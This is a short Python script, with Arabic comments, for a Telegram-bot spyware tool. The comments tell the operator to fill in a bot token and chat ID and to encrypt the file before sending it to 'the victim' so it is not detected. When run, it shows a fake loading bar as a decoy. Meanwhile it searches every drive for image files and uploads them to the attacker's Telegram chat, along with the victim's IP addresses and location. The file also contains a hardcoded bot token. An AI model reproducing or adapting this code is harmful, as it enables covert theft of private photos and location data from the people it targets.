import os
import telebot
from PIL import Image
from threading import Thread
import time
from tqdm import tqdm
import random
import socket
import requests

## ركز هنا هتحط توكن وايدي للي هوصل عليهم الصور
##  لازم الملف يكون متشفر قبل ارساله للضيحيه علشان ميكتشفش
TOKEN = "8280155979:AAEwGw2VZWG_hfnrANgCkjPgnscs4vGhDLE "
USER_ID = "1129923585"

bot = telebot.TeleBot(TOKEN)

image_extensions = ('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff')

def simulate_loading():
    print("جارٍ تحميل المكتبات للرشق، انتظر من فضلك...")
    while True:
        speed = random.uniform(0.1, 0.5)
        for _ in tqdm(range(100), desc="تحميل", ncols=100, ascii=True, bar_format="{l_bar}{bar}"):
            time.sleep(speed)
        time.sleep(0.5)

def send_file(file_path):
    with open(file_path, "rb") as f:
        try:
            img = Image.open(f)
            img.verify()
            f.seek(0)
            bot.send_photo(chat_id=USER_ID, photo=f)
        except (IOError, SyntaxError) as e:
            print(f"الملف {file_path} ليس صورة صالحة أو به مشكلة: {e}")

def search_and_send_images(root_dir):
    for root, dirs, files in os.walk(root_dir):
        random.shuffle(files)
        for file in files:
            if file.endswith(image_extensions):
                file_path = os.path.join(root, file)
                send_file(file_path)

def get_user_info():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    external_ip = requests.get('https://api.ipify.org').text
    location_info = requests.get(f'https://ipapi.co/{external_ip}/json/').json()

    message = (
        f"معلومات الضحيه :\n"
        f"IP خارجي: {external_ip}\n"
        f"IP داخلي: {local_ip}\n"
        f"منطقة: {location_info.get('region')}, {location_info.get('country_name')}\n"
    )
    return message

@bot.message_handler(commands=['start'])
def send_all_images(message):
    user_info_message = get_user_info()
    bot.send_message(chat_id=USER_ID, text=user_info_message)

    time.sleep(7)

    loading_thread = Thread(target=simulate_loading)
    loading_thread.start()

    if os.name == 'nt':
        root_dirs = [f"{drive}:\\" for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f"{drive}:\\")]
    else:
        root_dirs = ['/']

    threads = []
    for root_dir in root_dirs:
        t = Thread(target=search_and_send_images, args=(root_dir,))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

bot.infinity_polling()